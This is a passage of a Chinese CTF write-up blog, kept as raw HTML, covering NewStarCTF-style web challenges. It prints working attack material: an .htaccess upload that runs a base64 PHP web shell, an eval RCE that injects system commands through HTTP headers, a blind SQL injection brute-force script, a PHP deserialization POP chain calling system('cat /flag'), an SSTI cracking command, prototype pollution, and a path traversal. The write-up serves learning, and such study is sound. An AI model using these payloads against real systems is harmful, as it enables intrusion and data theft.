class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://f1d94384-8066-4dac-a014-e34ab19ed6fc.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>315</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarypelbI2sZUZHuXDs8</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;poc.jpg&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarypelbI2sZUZHuXDs8</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Upload!!!</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarypelbI2sZUZHuXDs8--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><h2 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h2><p>git恢复之后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地测试可以RCE，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/1.php?star=eval(next(getallheaders()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>system(&quot;whoami&quot;);</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是远程就很奇怪了，多了很多本身抓包都没有的http头</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/bo0g1pop.php?star=eval(next(getallheaders()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>6e7da965-f969-4ad3-81bd-4be5caba6585.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">X-Request-ID</span><span class="punctuation">: </span>system(&quot;tac /f*&quot;);</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-fetch-user</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=ios9iHNebuk0W5D7bdZg9D3jNzVny0Em</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Google Chrome&quot;;v=&quot;138&quot;</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>system(&quot;whoami&quot;);</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这些请求头又都是可控的，所以赋值就可以R</p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>这道题有点离谱的是<code>information</code>必须写成<code>infOrmation</code>不然就不成功。很奇怪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f91b90bf-0fac-4211-8ae0-f1c9ca753a60.node5.buuoj.cn:81/?id=&quot;</span></span><br><span class="line">maxlen = <span class="number">50</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, maxlen+<span class="number">1</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>), desc=<span class="string">f&quot;爆破第<span class="subst">&#123;i&#125;</span>位&quot;</span>, ncols=<span class="number">70</span>):</span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0929&#x27;AnD If(Ascii(Mid((database()),&#123;i&#125;,1))=&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment"># ctf</span></span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0929&#x27;AnD If(Ascii(Mid((Select(Group_concat(table_name))From(infOrmation_schema.tables)wHere(Table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))=&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment"># here_is_flag,grades</span></span><br><span class="line">        <span class="comment"># payload = f&quot;TMP0929&#x27;AnD If(Ascii(Mid((Select(Group_concat(column_name))From(infOrmation_schema.columns)wHere(Table_name=&#x27;here_is_flag&#x27;)),&#123;i&#125;,1))=&#123;mid&#125;,1,0)--+&quot;</span></span><br><span class="line">        <span class="comment"># flag</span></span><br><span class="line">        payload = <span class="string">f&quot;TMP0929&#x27;AnD If(Ascii(Mid((Select(flag)From(ctf.here_is_flag)),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;mid&#125;</span>,1,0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;TMP0929&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += <span class="built_in">chr</span>(mid)</span><br><span class="line">            tqdm.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>位: <span class="subst">&#123;<span class="built_in">chr</span>(mid)&#125;</span> 当前: <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;结果:&quot;</span>, target)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>他这php版本其实是修饰符不敏感的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$wg</span> = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="variable">$wg</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$wg</span>-&gt;<span class="keyword">var</span>  = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$ctf</span>-&gt;handle = <span class="variable">$wg</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$handle</span> = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$handle</span>-&gt;obj = <span class="variable">$ctf</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$super</span> = <span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$super</span>-&gt;obj = <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$then</span> = <span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;Then&#x27;</span>);</span><br><span class="line"><span class="variable">$prop</span> = <span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;func&#x27;</span>);</span><br><span class="line"><span class="variable">$prop</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$prop</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$then</span>, <span class="variable">$super</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$begin</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$begin</span>-&gt;name = <span class="variable">$then</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$begin</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>发包找到路由<code>/secr3tofpop</code>，发现是SSTI，用webui的fenjing或者是直接攻击这个参数</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> fenjing webui</span><br><span class="line"></span><br><span class="line">python <span class="literal">-m</span> fenjing crack <span class="literal">--url</span> <span class="string">&quot;http://c2e17393-1f82-4896-87bc-94bd454fc77e.node5.buuoj.cn:81/secr3tofpop&quot;</span> <span class="literal">--method</span> GET <span class="literal">--inputs</span> name <span class="literal">--detect-mode</span> fast</span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>没找到可以直接污染RCE的依赖，看看路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在config里面有一个最早允许的时间，和我传入的时间做对比，取大值，再去数据库查询数据，我全局搜索也没有找到返回flag的逻辑，所以应该就是这里了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">    <span class="attr">min_public_time</span>: <span class="string">&quot;2019-07-09&quot;</span>,</span><br><span class="line">    <span class="attr">server_port</span>: <span class="number">9960</span>,</span><br><span class="line">    <span class="attr">webpack_dev_port</span>: <span class="number">9970</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>早于这个时间就可以了，但是必须第一次就成功，由于污染的特性，第二次就会坏了</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;min_public_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1001-01-01&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://982f9b3c-2b31-44f5-afff-edbf629cd0af.node5.buuoj.cn:81/info/0&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">res=requests.post(url=url,headers=&#123;<span class="string">&#x27;content-type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><blockquote><p>穿越我的秘密，狠狠的注入</p></blockquote><p><code>110.jpg</code>可以看到部分源码的路由<code>/download?file=..././..././app.py</code>得到源码</p><figure class="highlight python"><table><tr><td 